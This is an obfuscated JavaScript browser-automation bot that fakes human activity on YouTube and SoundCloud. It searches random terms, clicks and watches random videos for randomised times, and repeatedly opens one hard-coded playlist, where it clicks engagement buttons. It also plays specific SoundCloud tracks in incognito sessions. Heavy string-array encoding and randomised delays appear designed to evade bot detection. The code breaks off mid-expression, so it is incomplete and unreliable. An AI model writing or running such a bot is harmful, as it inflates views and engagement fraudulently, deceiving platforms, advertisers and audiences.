const X = b,
  W = d,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x79c + -0x142b * 0x1 + -0x8 * -0x379))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * -0x1bd5 + 0x3 * -0x1cf + -0x1668), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x20b * -0x39 + 0x11 * -0x445 + -0x1 * -0x13238 + (0x728f + -0x752d + 0x3d36) * random()) : await standardWaitForNetIdle(f), await wait(0x12fc + -0x1c3 * 0x1 + 0xc5 * 0x3 + (-0x765 * 0x1 + -0x4b5d + -0x1f7 * -0x3e) * random()), -0xd * 0x169 + -0xc28 + 0xa2a * 0x3;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xb * 0x31a + -0x144 * -0x10 + 0x23a * 0xf), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0xeba + -0x2111 * -0x1 + -0x2fca;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xd19 + -0x1299 + 0x580);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function randomWait() {
  return await wait(-0x292 * -0x1 + 0x1 * 0x1979 + -0x883 * 0x1 + (0x1 * -0x13ed + 0x2 * 0x5c0 + 0x1bf5) * random()), 0x5dc + 0x1 * -0xa7b + 0x4a0;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xd19 + -0x1299 + 0x580);
    let h = e[f];
    if (c['ptrhjE'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1 * -0x9a7 + 0x16 * 0x9c + 0x170f * -0x1, r, s, t = -0x1e4d + 0x23ee + -0x5a1; s = m['charAt'](t++); ~s && (r = q % (-0x79c + -0x142b * 0x1 + -0x5 * -0x58f) ? r * (-0x1 * -0x1bd5 + 0x3 * -0x1cf + -0x1628) + s : s, q++ % (0x1369 * -0x1 + 0x13 * -0xa3 + -0x1 * -0x1f86)) ? o += String['fromCharCode'](0x2630 + -0x270f + 0x1de & r >> (-(0x12fc + -0x1c3 * 0x1 + 0x153 * -0xd) * q & -0x3b3 * 0x1 + -0x25af + -0x6a * -0x64)) : -0xd * 0x169 + -0xc28 + 0x45b * 0x7) {
          s = n['indexOf'](s);
        }
        for (let u = -0xb * 0x31a + -0x144 * -0x10 + 0x2c6 * 0x5, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xeba + -0x2111 * -0x1 + -0x2fbb))['slice'](-(-0x292 * -0x1 + 0x1 * 0x1979 + -0x1c09 * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['hGWQwl'] = i, b = arguments, c['ptrhjE'] = !![];
    }
    const j = e[0x1 * -0x13ed + 0x2 * 0x5c0 + 0x86d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['hGWQwl'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x28 * 0x25 + -0x1b * -0x43 + -0xcd9, 0x8 * -0x17b + 0x1 * 0x25ff + -0x688 * 0x4), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x14b8e + -0x10 * 0x29c + -0x25fae * -0x1) * getRandomInt(0x30 * 0x58 + 0x1ff * -0xf + 0xd73, -0x8ab + -0x84b * 0x1 + 0x10fb), h)), 0x2641 + -0x13 * 0x14b + -0xdaf;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x5aa + 0x1bad * 0x1 + 0x73 * -0x31;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x724 * 0x1 + 0x1bb7 + -0x2 * 0xa49]['split']('\x20');
    for (let k = 0x17e9 + 0xd4 + 0x83f * -0x3; k < i['length']; k += 0x26b * -0x10 + 0x202b + 0x1 * 0x687)
      j += i[k] * h[i[k + (0x1e46 + -0x5 * -0x6cd + -0x4046)]];
    return j;
  });
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xd19 + -0x1299 + 0x580);
    let h = e[f];
    if (b['sSolFr'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1 * -0x9a7 + 0x16 * 0x9c + 0x170f * -0x1, s, t, u = -0x1e4d + 0x23ee + -0x5a1; t = n['charAt'](u++); ~t && (s = r % (-0x79c + -0x142b * 0x1 + -0x5 * -0x58f) ? s * (-0x1 * -0x1bd5 + 0x3 * -0x1cf + -0x1628) + t : t, r++ % (0x1369 * -0x1 + 0x13 * -0xa3 + -0x1 * -0x1f86)) ? p += String['fromCharCode'](0x2630 + -0x270f + 0x1de & s >> (-(0x12fc + -0x1c3 * 0x1 + 0x153 * -0xd) * r & -0x3b3 * 0x1 + -0x25af + -0x6a * -0x64)) : -0xd * 0x169 + -0xc28 + 0x45b * 0x7) {
          t = o['indexOf'](t);
        }
        for (let v = -0xb * 0x31a + -0x144 * -0x10 + 0x2c6 * 0x5, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xeba + -0x2111 * -0x1 + -0x2fbb))['slice'](-(-0x292 * -0x1 + 0x1 * 0x1979 + -0x1c09 * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * -0x13ed + 0x2 * 0x5c0 + 0x86d,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x5dc + 0x1 * -0xa7b + 0x49f; u < 0x28 * 0x25 + -0x1b * -0x43 + -0xbd9; u++) {
          p[u] = u;
        }
        for (u = 0x8 * -0x17b + 0x1 * 0x25ff + -0x1a27 * 0x1; u < -0x1ba2 + -0xb * 0x51 + -0x201d * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x30 * 0x58 + 0x1ff * -0xf + 0xe71), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x8ab + -0x84b * 0x1 + 0x10f6, q = 0x2641 + -0x13 * 0x14b + -0xdb0;
        for (let v = -0x5aa + 0x1bad * 0x1 + 0x73 * -0x31; v < n['length']; v++) {
          u = (u + (-0x724 * 0x1 + 0x1bb7 + -0x2 * 0xa49)) % (0x17e9 + 0xd4 + 0x67 * -0x3b), q = (q + p[u]) % (0x26b * -0x10 + 0x202b + 0x1 * 0x785), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1e46 + -0x5 * -0x6cd + -0x3f47)]);
        }
        return t;
      };
      b['zeTomR'] = m, c = arguments, b['sSolFr'] = !![];
    }
    const j = e[-0x1b69 + 0xe6 + 0x1a83 * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['JDKOUA'] === undefined && (b['JDKOUA'] = !![]), h = b['zeTomR'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1b69 + 0xe6 + 0x1a89 * 0x1)['map'](l => Array['from'](l['children']))['flat'](0x14e2 + -0x4 * 0x274 + -0x1 * 0xb11)['map'](l => l['childNodes'][0x11ba + -0xa7b * 0x2 + -0x1 * -0x33d]['childNodes'][0x2127 + 0x1190 + -0x32b7]['childNodes'][0x18d1 * -0x1 + -0x16d9 * -0x1 + 0x1f9]['childNodes'][0x5f7 + 0x2667 + -0x2c5e]['childNodes'][-0x3d1 + -0x1269 + -0x10f * -0x15]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x6f * 0x4f + -0x1625 * -0x1 + -0x347e, 0x1 * -0x81e + 0x828 + 0x137e)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x10 * -0x5b6 + 0x40c2 + 0x5536);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1d0a3 + 0xb056 * 0x2 + -0x1 * -0x15a57) * getRandomInt(0x3f5 + -0x1 * -0x151a + -0x190d, 0x503 + 0x16e6 + -0x1be4), h);
  return await wait(i), 0x20c0 + -0x2011 * 0x1 + 0x2 * -0x57;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x76 + 0x1212 + -0x1288]['children'][-0x25e + 0x3 * -0x5ed + 0x1425]['children'][-0x1a14 * 0x1 + 0xc74 * -0x2 + -0x2 * -0x197e]['children'][0x1a37 + 0xd18 + -0x274f]['children'][0x1 * -0x166f + 0x22 * -0x19 + 0x15b * 0x13]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1c1 * -0x13 + -0x1dd2 + -0xe0 * 0x4;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1279 * 0x1 + -0xc8 * -0x10 + -0x1 * 0x1e95 + (0x8df + 0x63c + -0xee9) * random()
  }), await wait(-0x63f + -0x1f9a + -0x1 * -0x27cd + (0xd5a + -0x1 * -0x51b + -0xf * 0x127) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xae + 0x2c0 + -0x36c]['childNodes'][-0x2211 + 0x20 * 0x24 + 0xa * 0x2f5]['childNodes'][0x254a + 0x4 * -0x2bc + 0x47 * -0x5f]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x2 * 0x865 + 0xa33 * 0x2 + -0x37 * 0xad]['childNodes'][0x4e7 * 0x3 + 0x1f3 + 0x215 * -0x8]['childNodes'][0x12ec + 0x2 * -0xa16 + 0x17 * 0xe]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x523 * 0x3 + -0x12 * -0x18e + -0x2b64),
          r = 0x849 + 0x6ee * -0x5 + 0x1a5d;
        for (let u = 0x3c8 + -0x1 * -0x24df + 0xd8d * -0x3; u < q['length']; u += 0x63c + -0x1 * -0xd3d + -0x1377)
          r += q[u] * k[q[u + (0xab7 + 0xd68 + -0x181e)]];
        return r;
      }(n);
  });
  await wait((0x6c85 + -0x1 * 0x6bff + -0x2 * -0x1d09) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x13 * 0x269 + 0x66e * -0x2b + 0x22ca5) * getRandomInt(-0x1 * 0x1563 + 0xb62 + -0x3d * -0x2a, -0x1fa3 + 0x9ef * 0x1 + 0x15be), h + (0x43b * 0x3 + 0x1 * 0x1171 + -0x76 * 0x17));
  return await wait(i), -0x534 + 0x445 * 0x1 + 0xf0;
}
async function keyWatch(f) {
  const R = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * 0xabb + 0x1 * 0x112f + 0x1 * -0x1bea), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + R(0xe) + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + R(0x13) + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x10 + -0x1c21 + 0x27c9 + (-0x1 * -0xa13 + 0x20e1 + -0x270c) * Math['random']());
    });
  }, -0xd * 0x39e + -0x117b + -0x1 * -0x5bd9);
  await wait(0x85fcf + 0x107 * 0x81a + -0xe91 * 0xd5);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x2 * -0x6cc1 + -0x1 * 0xe761 + 0x2ab43) * getRandomInt(-0xc5b + 0x4e * -0x35 + -0x1c85 * -0x1, 0x2fb + 0xd62 + -0x1044)), clearInterval(h), 0x21d3 + 0x5a0 + -0x2772;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xf * -0x13 + 0xa81 * -0x1 + 0xb9e;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1d00 + 0x3f3 * -0x4 + -0x6d * 0x1f;
    await randomWait();
  }
  return 0x1e9e + 0x204e + -0x3eeb;
}

function fetchRandomSC() {
  return Math['random']() <= 0x9d0 * 0x2 + -0x7a9 + -0xbf7 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x188 * 0x11 + -0x90d * -0x2 + 0x7ee + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x181d + 0xd9b * -0x2 + 0x3353 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x4ea * 0x1 + 0x1604 + -0x111a;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x4 * -0x3041 + -0x9b32 + 0x20bfe + getRandomInt(0x1d15 + 0x643d * -0x1 + 0xc * 0xad0, -0x2eec + -0xd * 0x88c + 0x11338 * 0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xc5b * -0x2 + 0x1f88 * -0x1 + 0x6d3), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x2 * -0x27f + 0x1 * 0xcff + -0x11fd;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x12be + 0x48b * 0x5 + -0x2975, 0x123 * -0x1f + -0x532 * 0x5 + -0x4f * -0xc7)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * -0xc65 + -0x78a + 0x1bbf + floor((0xe5 * -0x2 + 0xc1a + 0x148 * -0x5) * random()))), log('p2'), log(await s['evaluate'](() => {
        const T = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xc03633e4 + 0x7 * -0x216b2d94 + 0x22a2472f * 0x10),
          -0xf * -0x6c7a4 + -0xc3b3d7 + 0xde013b,
          0x997b + -0x1 * 0xfd10 + 0xe395,
          -0xf40 + 0x2 * -0xf8f + 0x2ede
        ], y = [
          -0x1ba8 + 0x866 + -0x135a * -0x1,
          -0x35 * 0xa3 + -0x1fa3 + 0x4172 * 0x1,
          -0x162 + -0x6 * -0x129 + -0x58c,
          0x1 * 0x1ee4 + 0xd * -0x19 + -0x1d9f
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x322 + -0x4 * 0x7cb + 0x224f)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x38f * -0x1 + 0x2 * -0x5b9 + 0x7e3; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const S = c;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x18ad * -0x1 + -0x631 * -0x5 + -0x648) === N['length'])
                  return J(N);
              }
              return K[S(0x7)]('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x2252 + -0x84f + 0x2aa1] = A[0x163f + -0x673 * -0x1 + -0x1ca2] = A[-0xa59 + 0x24ef + 0x551 * -0x5] = A[0x1 * 0x267b + -0x1 * 0x1f3c + 0x11 * -0x6d] = A[0x963 * 0x2 + 0x26cb + 0x116 * -0x35] = A[0xbaa + 0x1367 * -0x1 + 0x5 * 0x18d] = A[-0x3 * 0x155 + 0xa * -0x259 + -0x66 * -0x45] = A[-0x2227 + 0x14af * -0x1 + -0xdb7 * -0x4] = A[-0x3f4 + 0x3ef + 0x6 * 0x2] = A[-0x1372 * -0x1 + 0x121f * -0x1 + -0x14b] = A[0x1 * 0x2b3 + -0x2 * 0x11ea + 0x212a] = A[0x1e6 * -0x10 + 0x1 * -0x36c + -0x21d6 * -0x1] = A[-0xa9 + 0x1fa1 + 0x1 * -0x1eed] = A[-0xa3d + -0x400 + -0x35 * -0x45] = A[-0x1690 + 0xd * -0xb + 0x172c * 0x1] = A[-0x495 + 0x4 * -0x35b + 0x120f * 0x1] = A[0x31 * -0x33 + -0x9 * -0x332 + -0x12f0] = 0x41 * 0x15 + -0x1beb + 0x1696, this['blocks'] = A) : this['blocks'] = [
                0xc92 * 0x1 + -0x17 * -0x12b + -0x5 * 0x7e3,
                -0x593 * -0x1 + -0x1ae3 + 0x1550,
                -0x22f5 + 0x127d + 0x8 * 0x20f,
                0x16e + 0x7 * 0xe + -0x1d0,
                0x1778 + 0x107b + -0x27f3,
                0x994 + 0x32d + 0x5 * -0x28d,
                -0x171a * 0x1 + -0x1c84 + -0x339e * -0x1,
                0x43 * -0x26 + 0xb5 + 0x5 * 0x1d9,
                -0x8 * 0x11b + 0x155e * -0x1 + 0x1e36,
                0x29c * 0x6 + -0x5f + 0xf49 * -0x1,
                -0x4e4 + 0x9f * 0x9 + -0xb3,
                0x1 * 0x1d89 + 0x12ad * -0x1 + -0xadc,
                -0x56 * -0x3c + -0x5a0 + -0xe88,
                -0x389 * -0x3 + 0x1ba6 * -0x1 + -0x1 * -0x110b,
                0x1 * -0x2635 + 0x95f * 0x4 + 0x25 * 0x5,
                0x1f * -0xd3 + -0x1e7b + 0x3808,
                0x2b5 + -0xcb5 * -0x1 + -0xf6a
              ], this['h0'] = -0x1 * -0x325cd3a9 + -0x1b * -0x13dbbdf + 0x13657ed3, this['h1'] = -0x9 * 0x3279bc87 + 0x3db99470 + 0x238 * 0x11d01ad, this['h2'] = 0xae228cd5 + 0xaa05dac4 + -0xbf6d8a9b * 0x1, this['h3'] = -0x2 * -0x2990303 + 0x34 * -0x2af720 + 0x10 * 0x13ba80f, this['h4'] = 0x13b2db5 * 0x37 + 0x132240ae5 * -0x1 + 0x1b2401af2, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x7d9 + -0x682 + 0x31 * -0x7, this['finalized'] = this['hashed'] = -0x245f + -0x3 * 0x55 + 0x255e, this['first'] = -0x1fb2 + 0x1253 * -0x2 + -0x4459 * -0x1;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x131f + -0x266b + 0x134c, O = J['length'] || -0x5 * -0x264 + 0x26ff + -0x32f3 * 0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x2b7 + -0x23a1 + 0x2658, P[-0x80 * -0x43 + 0x1 * 0xf4f + -0x30cf] = this['block'], P[0x184d * 0x1 + 0x1571 + -0x2dae] = P[-0x137e * -0x1 + -0x8ff * 0x3 + -0x3c0 * -0x2] = P[-0x1 * 0x1097 + -0xffe * -0x1 + 0x9b] = P[0x81e * 0x1 + -0x606 + -0x215] = P[0x124e + 0x21f8 + 0x1a21 * -0x2] = P[-0x647 + 0x21d * -0x5 + -0x10dd * -0x1] = P[0x159b + 0x26c1 + 0x2 * -0x1e2b] = P[0x14d3 + 0x2384 + -0x3850] = P[0x1d8d + -0x21e * -0xe + 0x5 * -0xbd5] = P[0x20 * 0x47 + -0x1d61 + 0x148a] = P[-0x1 * 0x1e89 + 0xc1 * 0x16 + 0xdfd] = P[-0x2365 + 0x258a * 0x1 + -0x21a] = P[-0x425 * 0x1 + -0x1b * 0x107 + 0x7a * 0x43] = P[0x130c * -0x1 + 0xf40 + -0x3d9 * -0x1] = P[-0x915 + -0xf56 + 0x1879] = P[0x11 * -0x87 + -0x1 * -0x11f2 + 0x23b * -0x4] = -0xd * -0x2b7 + 0x2cd * 0x9 + -0x40 * 0xf2), K) {
                    for (N = this['start']; M < O && N < -0x27d * -0x7 + 0x9 * -0x13 + -0x580 * 0x3; ++M)
                      P[N >> -0x1 * 0xd5b + 0x79f * 0x1 + -0x1e * -0x31] |= J[M] << y[0x493 * 0x1 + -0xd7c + 0x8ec & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2 * 0x545 + -0x31 * -0xa7 + 0x152d * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x1066 + 0x1428 + -0x240e ? P[N >> -0x2399 + 0x17e * 0x1a + -0x331] |= L << y[0x2 * -0x2fa + -0x1 * -0x1093 + 0x1c * -0x61 & N++] : L < -0x1 * -0x324 + 0xc92 + 0x6 * -0x149 ? (P[N >> -0xbe6 + -0x1b0e + -0x1 * -0x26f6] |= (0xd38 + -0x6 * -0x48b + 0x27ba * -0x1 | L >> 0x1 * 0x1523 + 0x16d3 + -0x98 * 0x4a) << y[-0x101a + 0x609 + 0xa14 & N++], P[N >> 0x1 * -0x8dd + 0x2 * -0xb96 + 0x200b] |= (-0x1 * -0x1f23 + -0x11 * 0xd3 + -0x10a0 | -0x209f * 0x1 + -0x82d + 0x290b & L) << y[0xefa * -0x1 + 0x135 * 0x7 + -0x22e * -0x3 & N++]) : L < -0xf32a + -0x123fb * -0x1 + -0x151 * -0x7f || L >= -0x140e9 + -0x20 * -0xcc4 + 0x8869 ? (P[N >> 0x70a * -0x3 + 0x3b * 0xb + 0x1297 * 0x1] |= (0xc71 + 0x1 * 0x41b + -0x76 * 0x22 | L >> -0xa03 + 0x73 * -0x3a + 0x241d) << y[-0x14f9 + -0x1d5 + -0xb * -0x213 & N++], P[N >> 0x9 * -0x1c4 + -0x2635 * -0x1 + -0x164f * 0x1] |= (-0x143 + -0x5 * 0x4bb + 0x196a | L >> -0x5 * -0x689 + 0x5c6 * 0x4 + 0x37bf * -0x1 & -0x7f * 0x36 + 0x2 * -0xa9f + 0x3047) << y[-0x1b9 + 0x5 * 0xf5 + -0x30d & N++], P[N >> -0x1bd1 + 0x13c8 + -0x47 * -0x1d] |= (-0x15be + -0x630 + 0x1c6e | -0xd * 0x135 + 0x4 * 0x8c5 + -0x14 * 0xf5 & L) << y[0x1753 + 0x1395 * 0x1 + -0x2ae5 & N++]) : (L = -0x16900 + -0xbfd5 * 0x2 + 0x3e8aa + ((0x1345 + -0x1f84 + 0x103e & L) << -0x14e * 0x18 + -0x19d5 * -0x1 + 0x1 * 0x585 | -0x1ce1 + 0x1 * 0x4ca + -0xe0b * -0x2 & J['charCodeAt'](++M)), P[N >> -0x29 + -0x1 * 0x87 + 0x1 * 0xb2] |= (0x8 * 0x391 + -0x1348 + -0x26 * 0x38 | L >> 0x1 * 0x829 + 0x3 * -0x41b + 0x1 * 0x43a) << y[0x2 * 0x11c + 0xd91 + 0x542 * -0x3 & N++], P[N >> -0x244a + -0x374 + 0x27c0] |= (0x2 * 0x951 + -0x4 * -0x76e + -0x2fda | L >> -0x1 * 0x1168 + -0x1b1 * -0x4 + 0xab0 & -0x2468 + -0x3 * 0x503 + 0x676 * 0x8) << y[-0x1 * -0x1a17 + 0x53 * 0x11 + -0x1f97 & N++], P[N >> 0x4 * 0x9 + 0x115e + -0x1180] |= (-0x323 * 0xb + -0x5d8 + 0x28d9 | L >> -0x2 * -0x10d3 + -0x1dcb + -0x3d5 & -0x3 * -0x2e + 0x15a6 + 